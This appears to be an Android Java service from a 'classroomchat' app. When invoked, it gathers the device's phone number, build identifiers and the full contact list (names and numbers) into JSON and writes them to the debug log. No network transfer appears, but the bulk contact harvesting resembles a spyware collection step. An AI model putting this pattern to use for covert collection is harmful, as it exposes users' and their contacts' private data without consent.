package com.n2305.classroomchat;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class DataExportService extends IntentService {
    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public DataExportService(String name) {
        super(name);
    }

    public DataExportService() {
        super(DataExportService.class.toString());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            JSONObject phoneData = collectPhoneData();
            Log.d("DataExportService", phoneData.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    protected JSONObject collectPhoneData() throws JSONException {
        JSONObject phoneData = new JSONObject();

        addPhoneNumberToPhoneData(phoneData);
        addBuildDataToPhoneData(phoneData);
        addPhoneContactsToPhoneData(phoneData, fetchPhoneContacts());

        return phoneData;
    }

    protected void addPhoneNumberToPhoneData(JSONObject target) throws JSONException {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber = telephonyManager.getLine1Number();

        target.put("PhoneNumber", phoneNumber != null ? phoneNumber : JSONObject.NULL);
    }

    protected void addPhoneContactsToPhoneData(JSONObject target, List<PhoneContact> phoneContacts) throws JSONException {
        JSONArray jsonPhoneContacts = new JSONArray(JSONUtil.convertToJSONObjectList(phoneContacts));
        target.put("Contacts", jsonPhoneContacts);
    }

    protected void addBuildDataToPhoneData(JSONObject target) throws JSONException {
        JSONObject buildData = new JSONObject();
        buildData.put("Manufacturer", Build.MANUFACTURER);
        buildData.put("Model", Build.MODEL);
        buildData.put("Device", Build.DEVICE);
        buildData.put("Hardware", Build.HARDWARE);
        buildData.put("Product", Build.PRODUCT);
        buildData.put("Brand", Build.BRAND);
        buildData.put("User", Build.USER);
        target.put("Build", buildData);
    }

    protected ArrayList<PhoneContact> fetchPhoneContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Phone.CONTENT_URI,
                new String[]{Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER},
                null, null, null
        );

        ArrayList<PhoneContact> contacts = new ArrayList<PhoneContact>();

        if (cursor.moveToFirst()) {
            do {
                PhoneContact contact = new PhoneContact(
                        cursor.getString(0),
                        cursor.getString(1),
                        cursor.getString(2)
                );

                contacts.add(contact);
            } while (cursor.moveToNext());
        }

        cursor.close();

        return contacts;
    }

    protected class PhoneContact implements JSONUtil.JSONable {
        private String id;
        private String displayName;
        private String number;

        public PhoneContact(String id, String displayName, String number) {
            this.id = id;
            this.displayName = displayName;
            this.number = number;
        }

        public String toJSON() throws JSONException {
            JSONObject jsonObject = toJSONObject();

            return jsonObject.toString();
        }

        public JSONObject toJSONObject() throws JSONException {
            JSONObject jsonObject = new JSONObject();

            jsonObject.put("Id", id);
            jsonObject.put("DisplayName", displayName);
            jsonObject.put("Number", number);
            return jsonObject;
        }

        public String toString() {
            return String.format("%s [id=%s, displayName=%s, number=%s]", getClass().getSimpleName(), id, displayName, number);
        }
    }
}
